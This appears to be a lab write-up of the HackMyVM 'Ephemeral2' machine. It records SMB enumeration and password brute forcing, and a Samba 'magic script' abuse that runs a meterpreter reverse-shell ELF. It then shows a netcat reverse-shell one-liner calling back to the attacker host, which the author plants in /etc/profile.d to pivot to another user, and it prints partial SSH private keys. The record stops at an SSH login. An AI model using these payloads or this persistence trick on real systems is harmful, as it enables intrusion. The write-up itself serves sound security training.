| Name     | Difficulty | OS    | Target IP     | Link                                                   |
| -------- | ---------- | ----- | ------------- | ------------------------------------------------------ |
| WMessage | Easy       | Linux | 192.168.0.188 | https://hackmyvm.eu/machines/machine.php?vm=Ephemeral2 |

### ARP Scan

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo arp-scan -l | grep 43
192.168.0.188	08:00:27:7b:8a:43	PCS Systemtechnik GmbH
```

### Nmap Scan

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo nmap -p- -sV -sC 192.168.0.188 -oA nmap/ephemeral2.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-11 18:11 BST
Nmap scan report for 192.168.0.188
Host is up (0.00010s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 08:00:27:7B:8A:43 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -59m59s
|_nbstat: NetBIOS name: EPHEMERAL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-11T16:11:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```

### Exploring Port 80

Default Apache2 page:

![[Pasted image 20240811181311.png]]

I found a site in the `/foodservice`, but I couldn't find any information. Messing about with the message form didn't give me anything. This appears to be a rabbit hole:

![[Pasted image 20240811195638.png]]

Moving onto the SMB, null access is allowed to view the shares, but could not access:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ nxc smb 192.168.0.188 -u "" -p "" --shares
SMB         192.168.0.188   445    EPHEMERAL        [*] Windows 6.1 Build 0 (name:EPHEMERAL) (domain:home) (signing:False) (SMBv1:False)
SMB         192.168.0.188   445    EPHEMERAL        [+] home\: 
SMB         192.168.0.188   445    EPHEMERAL        [*] Enumerated shares
SMB         192.168.0.188   445    EPHEMERAL        Share           Permissions     Remark
SMB         192.168.0.188   445    EPHEMERAL        -----           -----------     ------
SMB         192.168.0.188   445    EPHEMERAL        print$                          Printer Drivers
SMB         192.168.0.188   445    EPHEMERAL        SYSADMIN                        
SMB         192.168.0.188   445    EPHEMERAL        IPC$                            IPC Service (ephemeral server (Samba, Ubuntu))
SMB         192.168.0.188   445    EPHEMERAL        Officejet_Pro_8600_CDECA1_ 
```

Using Enum4linux, I found the user `randy`:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ python3 /opt/enum4linux-ng/enum4linux-ng.py -A 192.168.0.188
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.0.188
[*] Username ......... ''
[*] Random Username .. 'ebdgmyho'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 192.168.0.188    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.0.188    |
 ============================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- EPHEMERAL       <00> -         B <ACTIVE>  Workstation Service
- EPHEMERAL       <03> -         B <ACTIVE>  Messenger Service
- EPHEMERAL       <20> -         B <ACTIVE>  File Server Service
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 ==========================================
|    SMB Dialect Check on 192.168.0.188    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 ============================================================
|    Domain Information via SMB session for 192.168.0.188    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: EPHEMERAL
NetBIOS domain name: ''
DNS domain: home
FQDN: ephemeral.home
Derived membership: workgroup member
Derived domain: unknown

 ==========================================
|    RPC Session Check on 192.168.0.188    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'ebdgmyho', password ''
[H] Rerunning enumeration with user 'ebdgmyho' might give more results

 ====================================================
|    Domain Information via RPC for 192.168.0.188    |
 ====================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 ================================================
|    OS Information via RPC for 192.168.0.188    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT ephemeral server (Samba, Ubuntu)

 ======================================
|    Users via RPC on 192.168.0.188    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 1 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 1 user(s) via 'enumdomusers'
[+] After merging user results we have 1 user(s) total:
'1001':
  username: randy
  name: randy
  acb: '0x00000010'
  description: ''

 =======================================
|    Groups via RPC on 192.168.0.188    |
 =======================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 =======================================
|    Shares via RPC on 192.168.0.188    |
 =======================================
[*] Enumerating shares
[+] Found 4 share(s):
IPC$:
  comment: IPC Service (ephemeral server (Samba, Ubuntu))
  type: IPC
Officejet_Pro_8600_CDECA1_:
  comment: ''
  type: Printer
SYSADMIN:
  comment: ''
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share Officejet_Pro_8600_CDECA1_
[+] Mapping: DENIED, Listing: N/A
[*] Testing share SYSADMIN
[+] Mapping: DENIED, Listing: N/A
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 ==========================================
|    Policies via RPC for 192.168.0.188    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: 5
  Maximum password age: 49710 days 6 hours 21 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: 49710 days 6 hours 21 minutes

 ==========================================
|    Printers via RPC for 192.168.0.188    |
 ==========================================
[+] Found 1 printer(s):
\\192.168.0.188\Officejet_Pro_8600_CDECA1_:
  description: \\192.168.0.188\Officejet_Pro_8600_CDECA1_,,
  comment: ''
  flags: '0x800000'

Completed after 0.66 seconds
```

I decided to see if it was possible to bruteforce this user as there was nothing else to go on:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ nxc smb 192.168.0.188 -u randy -p /opt/rockyou.txt --ignore-pw-decoding
SMB         192.168.0.188   445    EPHEMERAL        [*] Windows 6.1 Build 0 (name:EPHEMERAL) (domain:home) (signing:False) (SMBv1:False)
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:123456 STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:12345 STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:123456789 STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:password STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:iloveyou STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:princess STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:1234567 STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:sophia STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:chacha STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:biteme STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:marian STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:sydney STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [-] home\randy:sexyme STATUS_LOGON_FAILURE 
SMB         192.168.0.188   445    EPHEMERAL        [+] home\randy:pogiako
```

Username & password found:

```bash
randy:pogiako
```

This user has `READ/WRITE` access to `SYSADMIN`, and `READ` to `PRINT$`:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ nxc smb 192.168.0.188 -u randy -p pogiako --shares
SMB         192.168.0.188   445    EPHEMERAL        [*] Windows 6.1 Build 0 (name:EPHEMERAL) (domain:home) (signing:False) (SMBv1:False)
SMB         192.168.0.188   445    EPHEMERAL        [+] home\randy:pogiako 
SMB         192.168.0.188   445    EPHEMERAL        [*] Enumerated shares
SMB         192.168.0.188   445    EPHEMERAL        Share           Permissions     Remark
SMB         192.168.0.188   445    EPHEMERAL        -----           -----------     ------
SMB         192.168.0.188   445    EPHEMERAL        print$          READ            Printer Drivers
SMB         192.168.0.188   445    EPHEMERAL        SYSADMIN        READ,WRITE      
SMB         192.168.0.188   445    EPHEMERAL        IPC$                            IPC Service (ephemeral server (Samba, Ubuntu))
SMB         192.168.0.188   445    EPHEMERAL        Officejet_Pro_8600_CDECA1_
```

Logging into `SYSADMIN` we see three files:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ smbclient '\\192.168.0.188\SYSADMIN' -U 'randy%pogiako'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Aug 11 17:45:37 2024
  ..                                  D        0  Mon Apr 11 01:36:23 2022
  reminder.txt                        N      193  Mon Apr 11 01:59:06 2022
  smb.conf                            N     9097  Sat Apr  9 21:32:20 2022
  help.txt                            N     4663  Mon Apr 11 01:59:43 2022

		8704372 blocks of size 1024. 102780 blocks available
smb: \> 
```

Downloading files:

```bash
smb: \> get reminder.txt 
getting file \reminder.txt of size 193 as reminder.txt (31.4 KiloBytes/sec) (average 31.4 KiloBytes/sec)
smb: \> get smb.conf 
getting file \smb.conf of size 9097 as smb.conf (1480.6 KiloBytes/sec) (average 756.0 KiloBytes/sec)
smb: \> get help.txt 
getting file \help.txt of size 4663 as help.txt (910.7 KiloBytes/sec) (average 801.5 KiloBytes/sec)
smb: \> exit
```

Viewing the smb.conf:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ cat smb.conf 
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
<--SNIP-->
# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin

[SYSADMIN]

path = /home/randy/smbshare
valid users = randy
browsable = yes
writeable = yes
read only = no
magic script = smbscript.elf
guest ok = no

```

I've not seen the `magic script` option before, but a quick google search  I found this https://www.samba.org/samba/docs/using_samba/ch11.html:

![[Pasted image 20240811200236.png]]

So basically, when a user logs in, the or program that the `magic script` points to gets executed. I will create a meterpreter payload using msfvenom, save it as `smbscript.elf` and upload it:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=443 -f elf > smbscript.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
```

Set up Meterpreter:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST 192.168.0.51;set LPORT 443;run;"
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
LHOST => 192.168.0.51
LPORT => 443
[*] Started reverse TCP handler on 192.168.0.51:443 
```

Uploading the payload:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ smbclient '\\192.168.0.188\SYSADMIN' -U 'randy%pogiako'
Try "help" to get a list of possible commands.
smb: \> put smbscript.elf 
NT_STATUS_IO_TIMEOUT closing remote file \smbscript.elf
smb: \> 
```

Even though we have a time out I still got a shell:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST 192.168.0.51;set LPORT 443;run;"
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
LHOST => 192.168.0.51
LPORT => 443
[*] Started reverse TCP handler on 192.168.0.51:443 
[*] Sending stage (3045380 bytes) to 192.168.0.188
[*] Meterpreter session 1 opened (192.168.0.51:443 -> 192.168.0.188:33076) at 2024-08-11 18:59:00 +0100

meterpreter > getuid
Server username: randy
meterpreter > shell
Process 24670 created.
Channel 1 created.
whoami && id
randy
uid=1000(randy) gid=1000(randy) groups=1000(randy),133(sambashare)
pwd
/home/randy/smbshare
ls -lash
total 36K
4.0K drwxrwxrwx  2 randy randy 4.0K Aug 11 10:58 .
4.0K drwxr-xr-x 11 randy randy 4.0K Apr 10  2022 ..
8.0K -rw-r--r--  1 randy randy 4.6K Apr 10  2022 help.txt
4.0K -rw-r--r--  1 randy randy  193 Apr 10  2022 reminder.txt
 12K -rw-r--r--  1 randy randy 8.9K Apr  9  2022 smb.conf
4.0K -rwxr-xr-x  1 randy randy  250 Aug 11 10:58 smbscript.elf
```

Upgrading the shell:

```bash
whereis python3
python3: /usr/bin/python3 /usr/bin/python3.8 /usr/lib/python3 /usr/lib/python3.8 /usr/lib/python3.9 /etc/python3 /etc/python3.8 /usr/local/lib/python3.8 /usr/include/python3.8 /usr/share/python3 /usr/share/man/man1/python3.1.gz
python3 -c 'import pty;pty.spawn("/bin/bash")'
randy@ephemeral:~/smbshare$ 
```

Looks like we need to be `ralph` to read the first flag:

```bash
randy@ephemeral:~/smbshare$ ls -lash /home
ls -lash /home
total 16K
4.0K drwxr-xr-x  4 root  root  4.0K Apr  8  2022 .
4.0K drwxr-xr-x 20 root  root  4.0K Apr  7  2022 ..
4.0K drwxr-xr-x  7 ralph ralph 4.0K Apr 10  2022 ralph
4.0K drwxr-xr-x 11 randy randy 4.0K Apr 10  2022 randy
randy@ephemeral:~/smbshare$ ls -lash /home/ralph
ls -lash /home/ralph
total 48K
4.0K drwxr-xr-x 7 ralph ralph 4.0K Apr 10  2022 .
4.0K drwxr-xr-x 4 root  root  4.0K Apr  8  2022 ..
   0 lrwxrwxrwx 1 root  root     9 Apr  8  2022 .bash_history -> /dev/null
4.0K -rw-r--r-- 1 ralph ralph  220 Apr  8  2022 .bash_logout
4.0K -rw-r--r-- 1 ralph ralph 3.7K Apr  8  2022 .bashrc
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .cache
4.0K drwx------ 4 ralph ralph 4.0K Apr  9  2022 .config
4.0K drwxr-xr-x 3 ralph ralph 4.0K Apr  9  2022 .local
4.0K -rw-r--r-- 1 ralph ralph  807 Apr  8  2022 .profile
4.0K drwx------ 2 ralph ralph 4.0K Apr 10  2022 .ssh
4.0K -rw------- 1 root  root   297 Apr 10  2022 getfile.py
4.0K drwxrwxr-x 2 ralph ralph 4.0K Apr 10  2022 tools
4.0K -rw------- 1 ralph ralph   33 Apr  9  2022 user.txt
randy@ephemeral:~/smbshare$ cat /home/ralph/user.txt
cat /home/ralph/user.txt
cat: /home/ralph/user.txt: Permission denied
```

Gaining `ssh` access as `randy`, I created a private/public key pair and copied the public key to the `authorized_keys` file:

```bash
randy@ephemeral:~/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/randy/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/randy/.ssh/id_rsa
Your public key has been saved in /home/randy/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:D7UOPV0v1UX8t8RbJVrZ+8ime329R00UhUAQPglhdlM randy@ephemeral
The key's randomart image is:
+---[RSA 3072]----+
|        =.==E. B*|
|       o + o  = B|
|          =  ooo*|
|         o +.. *=|
|        S + ..ooO|
|         = .  +++|
|          o  o o.|
|            . . =|
|            .o .+|
+----[SHA256]-----+
randy@ephemeral:~/.ssh$ cp id_rsa.pub authorized_keys
cp id_rsa authorized_keys
randy@ephemeral:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA3SsWwhRyBuBVC2ztJ1U8q2/gpVEV3rYuJ2coKR4VtqQ0qBSdtZeR
ijrANNhRWT1oILHEt2JczvFLSmV3c5k97ijozmuDS4r9Ud1Kd/WL+5pdBjpjWk2G766vJ9
w8UesDqEkk8ouOAsmAqIZBh93oorVnzidnR6uYt8pqIqMnPzQsNjTjGSiYqnoS8ZLuVyTd
Pk2uvJMYe8FprMRHn5sZB3QE58DWLQNavUN9Oe+MoNlzDdJYzhtBmrdbCuYQmo9b/GwbwK
s9Zbl9WApB7zEqQFCj3GKRsSFYskPBhKqXb7lEaVBd7f4UeiQUUn11avtQyNp/DAsSSFcB
e15I7zCV8feN2iCg+z7Sqw7zkaPIngAbH/HBNbDlgTuvVIA2GekIhMHvdRA157PVDX0nhh
wcw7xwfoRX4eo/1H4NtEc5rPNY4yGiK09x7zc7F6qRPt5Q5sdC5fg3FKzUraqCyb2FseUm
<--SNIP-->
-----END OPENSSH PRIVATE KEY-----
```

Copying the private key to my host, and modifying it:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ vi id_rsa
garffff@garffff:~/hackmyvm/ephemeral2$ chmod 600 id_rsa
```

I can now log in as `randy` via `ssh`:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ ssh -i id_rsa randy@192.168.0.188
The authenticity of host '192.168.0.188 (192.168.0.188)' can't be established.
ED25519 key fingerprint is SHA256:flddRz8ds6vGH6oIgNv4hqo92558dFPJ3n8Fkzv15Uc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

randy@ephemeral:~$ whoami && id
randy
uid=1000(randy) gid=1000(randy) groups=1000(randy),133(sambashare)
```

### Privilege Escalation  - Ralph

Using `linpeas.sh`, the user `randy` has write access to the ````
/etc/profile.d/

```bash
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 48
drwxr-xr-x   2 randy root  4096 Apr  9  2022 .
drwxr-xr-x 132 root  root 12288 Apr 10  2022 ..
-rw-r--r--   1 randy root    97 Apr  9  2022 01-locale-fix.sh
-rw-r--r--   1 randy root   835 Feb 18  2022 apps-bin-path.sh
-rw-r--r--   1 randy root   729 Feb  1  2020 bash_completion.sh
-rw-r--r--   1 randy root  1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 randy root   349 Oct 28  2020 im-config_wayland.sh
-rw-r--r--   1 randy root  1368 Apr  9  2022 vte-2.91.sh
-rw-r--r--   1 randy root   967 Apr  9  2022 vte.csh
-rw-r--r--   1 randy root   954 Mar 26  2020 xdg_dirs_desktop_session.sh
You have write privileges over /etc/profile.d/
You have write privileges over /etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/01-locale-fix.sh
/etc/profile.d/vte.csh
/etc/profile.d/apps-bin-path.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/bash_completion.sh
```

Looking in `/etc/crontab` we see`/home/ralph/tools/ssh.sh` is being executed every minute:

```bash
randy@ephemeral:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	ralph	/home/ralph/tools/ssh.sh
```

The script `/home/ralph/tools/ssh.sh` logs in as `ralph`:

```bash
ralph@ephemeral:~$ cd tools/
ralph@ephemeral:~/tools$ cat ssh.sh 
#!/bin/bash


/usr/bin/ssh -o "StrictHostKeyChecking no" ralph@localhost -i /home/ralph/.ssh/id_rsa
```

The scripts in `/etc/profile.d/` are executed when a user logs into the host.  I created another msfvenom payload:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo msfvenom -p cmd/unix/reverse_netcat lhost=192.168.0.51 lport=444         
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 101 bytes
mkfifo /tmp/evocldz; nc 192.168.0.51 444 0</tmp/evocldz | /bin/sh >/tmp/evocldz 2>&1; rm /tmp/evocldz
```

And added it to `/etc/profile.d/bash_completion.sh`:

```bash
randy@ephemeral:~$ cat /etc/profile.d/bash_completion.sh
# shellcheck shell=sh disable=SC1091,SC2039,SC2166
# Check for interactive bash and that we haven't already been sourced.
mkfifo /tmp/evocldz; nc 192.168.0.51 444 0</tmp/evocldz | /bin/sh >/tmp/evocldz 2>&1; rm /tmp/evocldz
if [ "x${BASH_VERSION-}" != x -a "x${PS1-}" != x -a "x${BASH_COMPLETION_VERSINFO-}" = x ]; then

    # Check for recent enough version of bash.
    if [ "${BASH_VERSINFO[0]}" -gt 4 ] || \
       [ "${BASH_VERSINFO[0]}" -eq 4 -a "${BASH_VERSINFO[1]}" -ge 1 ]; then
        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] && \
            . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
            # Source completion code.
            . /usr/share/bash-completion/bash_completion
        fi
    fi

fi
```

After about a minute, I get a reverse shell as `ralph`: 

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ sudo nc -lvp 444
Listening on 0.0.0.0 444
Connection received on 192.168.0.188 60358
whoami && id
ralph
uid=1001(ralph) gid=1001(ralph) groups=1001(ralph)
```

Upgrading the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ralph@ephemeral:~$ ^Z
[1]+  Stopped                 sudo nc -lvp 444
garffff@garffff:~/hackmyvm/ephemeral2$ stty raw -echo
```

For some reason I couldn't read the entire ssh private key for `ralph`. It might be my terminal, I am not sure:

```bash
ralph@ephemeral:~/.ssh$ ls -lash
ls -lash
total 20K
4.0K drwx------ 2 ralph ralph 4.0K Apr 10  2022 .
4.0K drwxr-xr-x 7 ralph ralph 4.0K Apr 10  2022 ..
4.0K -rw-rw-r-- 1 ralph ralph  569 Apr  9  2022 authorized_keys
4.0K -rw------- 1 ralph ralph 2.6K Apr  9  2022 id_rsa
4.0K -rw-r--r-- 1 ralph ralph  222 Apr 10  2022 known_hosts
ralph@ephemeral:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn



ralph@ephemeral:~/.ssh$ 

```

So I copied it to the `/tmp` directory, and now I can read it... Weird:

```bash
ralph@ephemeral:~/.ssh$  cp id_rsa /tmp
ralph@ephemeral:~/.ssh$ cat /tmp/id_rsa
cat /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAu8JB2d+0bpbHLk6jqucCPHpXFxa1YAhEqLAco15tXcDBeMtAPncY
4M/vJYpHksMZaaBVSElMYb9tvOXVj6K9A0kNv1QZGlpyhQNBH0xSmjek6e1cEB//4ajZjC
G7O9g6nhkXzibCTySIdoNUOvf4l7GRuKTFAB3wWBrnq8Tja6YvqXQd4/pmoJm/GbTtdziM
0ixw99yazZCAmnE9vF/TiKjallPse7LjnXycw263QEa4iegrrp9jmouHFf68P0D4sA0/vE
OY+1mMbWiDsGFJmoM63HUaFmZnMw0ADP6QG9Uws8KVYSroYUbDeqYAzoF0N7ZJIZa7PjQw
9pa0nV/TwIYI75GTpkWxMwoBmW0MivzBcoHx4kgJbFAJXct99TeCdsnfUv27VrDDWAiOLJ
cpubAx4Y7jqwjA4GlYvvdR8JT69tY1Ohv3CWCCFdq8voxSC7Jup5x5bSErYn8MunwHwZ/I
Cyhzhiub08B/gWw4g3JYQDcKiG7z0LkwtAFBarBPAAAFiDbg6tc24OrXAAAAB3NzaC1yc2
EAAAGBALvCQdnftG6Wxy5Oo6rnAjx6VxcWtWAIRKiwHKNebV3AwXjLQD53GODP7yWKR5LD
GWmgVUhJTGG/bbzl1Y+ivQNJDb9UGRpacoUDQR9MUpo3pOntXBAf/+Go2YwhuzvYOp4ZF8
4mwk8kiHaDVDr3+JexkbikxQAd8Fga56vE42umL6l0HeP6ZqCZvxm07Xc4jNIscPfcms2Q
gJpxPbxf04io2pZT7Huy4518nMNut0BGuInoK66fY5qLhxX+vD9A+LANP7xDmPtZjG1og7
BhSZqDOtx1GhZmZzMNAAz+kBvVMLPClWEq6GFGw3qmAM6BdDe2SSGWuz40MPaWtJ1f08CG
CO+Rk6ZFsTMKAZltDIr8wXKB8eJICWxQCV3LffU3gnbJ31L9u1aww1gIjiyXKbmwMeGO46
sIwOBpWL73UfCU+vbWNTob9wlgghXavL6MUguybqeceW0hK2J/DLp8B8GfyAsoc4Yrm9PA
<--SNIP-->
-----END OPENSSH PRIVATE KEY-----
```

I logged into the device as `ralph`:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ ssh -i ralph_id ralph@192.168.0.188
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.13.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

20 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Sun Aug 11 11:37:27 2024 from 192.168.0.51
mkfifo: cannot create fifo '/tmp/evocldz': File exists
```

But my netcat payload is being executed. I will need to remove this from `/etc/profile.d/bash_completion.sh` as `randy`.

Now I can login a `ralph` and read the user flag:

```bash
garffff@garffff:~/hackmyvm/ephemeral2$ ssh -i ralph_id ralph@192.168.0.188
